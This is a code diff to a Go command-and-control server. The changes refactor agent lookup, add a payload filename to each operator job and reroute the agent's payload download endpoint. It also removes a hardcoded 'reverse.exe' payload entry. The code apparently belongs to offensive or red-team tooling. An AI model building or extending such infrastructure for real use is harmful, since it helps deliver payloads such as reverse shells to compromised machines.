@@ -82,7 +82,6 @@ func NewC2Server(hostOpt, portOpt, password string) (*C2Server, error) {
 	c2s.jobsStatuses = make(map[string]bool)
 	c2s.jobsResults = make(map[string]string)
 	c2s.completedJobs = make(map[string][]string)
-	c2s.payloads["cccccccccccccccc"] = "reverse.exe"
 	return &c2s, nil
 }
 
@@ -104,7 +103,7 @@ func (c2s *C2Server) setupRouter() (*gin.Engine, error) {
 	agent.Use(authAgentMiddleware.MiddlewareFunc())
 	{
 		agent.GET("/jobs", c2s.jobsHandler)
-		agent.GET("/payload/:job-uuid", c2s.payloadHandler)
+		agent.GET("/jobs/payload/:job-uuid", c2s.payloadHandler)
 		agent.POST("/jobs/update", c2s.updateJobStatusHandler)
 	}
 
@@ -123,6 +122,7 @@ func (c2s *C2Server) setupRouter() (*gin.Engine, error) {
 		operator.POST("/agents/job/add", c2s.addJobHandler)
 		operator.GET("/agents/:agent-uuid/jobs", c2s.getAllAgentJobsHandler)
 		operator.GET("/agents/:agent-uuid/jobs/:job-uuid/status", c2s.getJobStatusHandler)
+		// operator.POST("/agents/payloads/add", c2s.addPayloadHandler)
 	}
 	return r, nil
 }
@@ -226,14 +226,7 @@ func (c2s *C2Server) payloadHandler(c *gin.Context) {
 
 func (c2s *C2Server) updateJobStatusHandler(c *gin.Context) {
 	receivedAgent, _ := c.Get(c2s.agentIdentityKey)
-	agentFound := false
-	for _, agent := range c2s.activeAgents {
-		if agent.Uuid == receivedAgent.(*Agent).Uuid {
-			agentFound = true
-			break
-		}
-	}
-	if agentFound {
+	if c2s.findAgent(receivedAgent.(*Agent).Uuid) {
 		var updateJobStatusRequest struct {
 			JobUuid   string `json:"job-uuid"`
 			Status    bool   `json:"status"`
@@ -334,17 +327,12 @@ func (c2s *C2Server) agentsHandler(c *gin.Context) {
 
 func (c2s *C2Server) addJobHandler(c *gin.Context) {
 	var addJobRequest struct {
-		AgentUuid string `json:"agent-uuid" binding:"required"`
-		JobUuid   string `json:"job-uuid" binding:"required"`
+		AgentUuid       string `json:"agent-uuid" binding:"required"`
+		JobUuid         string `json:"job-uuid" binding:"required"`
+		PayloadFilename string `json:"payload-filename" binding:"required"`
 	}
-	agentFound := false
 	if c.Bind(&addJobRequest) == nil {
-		for _, agent := range c2s.activeAgents {
-			if addJobRequest.AgentUuid == agent.Uuid {
-				agentFound = true
-			}
-		}
-		if agentFound {
+		if c2s.findAgent(addJobRequest.AgentUuid) {
 			if len(c2s.activeJobs[addJobRequest.AgentUuid]) == 0 {
 				c2s.activeJobs[addJobRequest.AgentUuid] = []string{addJobRequest.JobUuid}
 			} else {
@@ -352,6 +340,7 @@ func (c2s *C2Server) addJobHandler(c *gin.Context) {
 			}
 			c2s.jobsStatuses[addJobRequest.JobUuid] = false
 			c2s.jobsResults[addJobRequest.JobUuid] = ""
+			c2s.payloads[addJobRequest.JobUuid] = addJobRequest.PayloadFilename
 			c.JSON(200, gin.H{"status": "ok"})
 		} else {
 			c.JSON(404, gin.H{"status": "agent not found"})
@@ -359,34 +348,32 @@ func (c2s *C2Server) addJobHandler(c *gin.Context) {
 	}
 }
 
-func (c2s *C2Server) getAllAgentJobsHandler(c *gin.Context) {
-	agentUuid := c.Param("agent-uuid")
+func (c2s *C2Server) findAgent(uuid string) bool {
 	agentFound := false
 	for _, agent := range c2s.activeAgents {
-		if agentUuid == agent.Uuid {
+		if uuid == agent.Uuid {
 			agentFound = true
 		}
 	}
-	if agentFound {
+	return agentFound
+}
+
+func (c2s *C2Server) getAllAgentJobsHandler(c *gin.Context) {
+	agentUuid := c.Param("agent-uuid")
+	if c2s.findAgent(agentUuid) {
+		type AgentJob struct {
+			Job    string `json:"job-uuid"`
+			Status bool   `json:"status"`
+			Result string `json:"job-result"`
+		}
 		var agentJobsStatus struct {
-			AgentUuid string `json:"agent-uuid"`
-			AgentJobs struct {
-				Job    string `json:"job-uuid"`
-				Status bool   `json:"status"`
-				Result string `json:"job-result"`
-			} `json:"agent-jobs"`
+			AgentJobs []AgentJob `json:"agent-jobs"`
 		}
 		for _, jobUuid := range c2s.activeJobs[agentUuid] {
-			agentJobsStatus.AgentUuid = agentUuid
-			agentJobsStatus.AgentJobs.Job = jobUuid
-			agentJobsStatus.AgentJobs.Status = c2s.jobsStatuses[jobUuid]
-			agentJobsStatus.AgentJobs.Result = c2s.jobsResults[jobUuid]
+			agentJobsStatus.AgentJobs = append(agentJobsStatus.AgentJobs, AgentJob{jobUuid, c2s.jobsStatuses[jobUuid], c2s.jobsResults[jobUuid]})
 		}
 		for _, jobUuid := range c2s.completedJobs[agentUuid] {
-			agentJobsStatus.AgentUuid = agentUuid
-			agentJobsStatus.AgentJobs.Job = jobUuid
-			agentJobsStatus.AgentJobs.Status = c2s.jobsStatuses[jobUuid]
-			agentJobsStatus.AgentJobs.Result = c2s.jobsResults[jobUuid]
+			agentJobsStatus.AgentJobs = append(agentJobsStatus.AgentJobs, AgentJob{jobUuid, c2s.jobsStatuses[jobUuid], c2s.jobsResults[jobUuid]})
 		}
 		c.JSON(200, &agentJobsStatus)
 	} else {
@@ -397,13 +384,7 @@ func (c2s *C2Server) getAllAgentJobsHandler(c *gin.Context) {
 func (c2s *C2Server) getJobStatusHandler(c *gin.Context) {
 	agentUuid := c.Param("agent-uuid")
 	jobUuid := c.Param("job-uuid")
-	agentFound := false
-	for _, agent := range c2s.activeAgents {
-		if agentUuid == agent.Uuid {
-			agentFound = true
-		}
-	}
-	if agentFound {
+	if c2s.findAgent(agentUuid) {
 		jobFound := false
 		for _, job := range c2s.activeJobs[agentUuid] {
 			if jobUuid == job {
@@ -424,6 +405,32 @@ func (c2s *C2Server) getJobStatusHandler(c *gin.Context) {
 		c.JSON(404, gin.H{"status": "agent not found"})
 	}
 }
+
+// func (c2s *C2Server) addPayloadHandler(c *gin.Context) {
+// 	var addPayloadHandler struct {
+// 		AgentUuid       string `json:"agent-uuid" binding:"required"`
+// 		JobUuid         string `json:"job-uuid" binding:"required"`
+// 		PayloadFilename string `json:"payload-filename" binding:"required"`
+// 	}
+// 	if c.Bind(&addPayloadHandler) == nil {
+// 		if c2s.findAgent(addPayloadHandler.AgentUuid) {
+// 			jobFound := false
+// 			for _, job := range c2s.activeJobs[addPayloadHandler.AgentUuid] {
+// 				if addPayloadHandler.JobUuid == job {
+// 					jobFound = true
+// 				}
+// 			}
+// 			if jobFound {
+// 				c2s.payloads[addPayloadHandler.JobUuid] = addPayloadHandler.PayloadFilename
+// 				c.JSON(200, gin.H{"status": "ok"})
+// 			} else {
+// 				c.JSON(404, gin.H{"status": "job not found"})
+// 			}
+// 		} else {
+// 			c.JSON(404, gin.H{"status": "agent not found"})
+// 		}
+// 	}
+// }
 
 func (c2s *C2Server) Run() error {
 	err := c2s.r.RunTLS(c2s.host+":"+c2s.port, "data/c2/"+c2s.host+".crt", "data/c2/"+c2s.host+".key")
